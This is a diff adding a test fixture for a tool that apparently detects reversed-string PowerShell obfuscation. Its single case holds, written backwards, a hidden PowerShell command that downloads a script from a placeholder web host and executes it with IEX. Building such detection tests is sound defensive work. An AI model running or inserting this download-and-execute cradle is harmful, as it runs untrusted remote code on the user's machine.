@@ -1,0 +1,3 @@
+# reverse-string · Golden Fixtures · RC3.2a
+# String reversal is one of the simplest PS obfuscators (see [array]::Reverse).
+{"case_id":"reverse-ps-iex","description":"Reversed PowerShell IEX","input":")')1sp.x/moc.e.b//:ptth' rwi( XEI c- w- neddih pon- exe.llehsrewop","detect_min_confidence":0.4,"expected_output_contains":["powershell.exe","-nop","IEX","http://b.e.com/x.ps1"]}
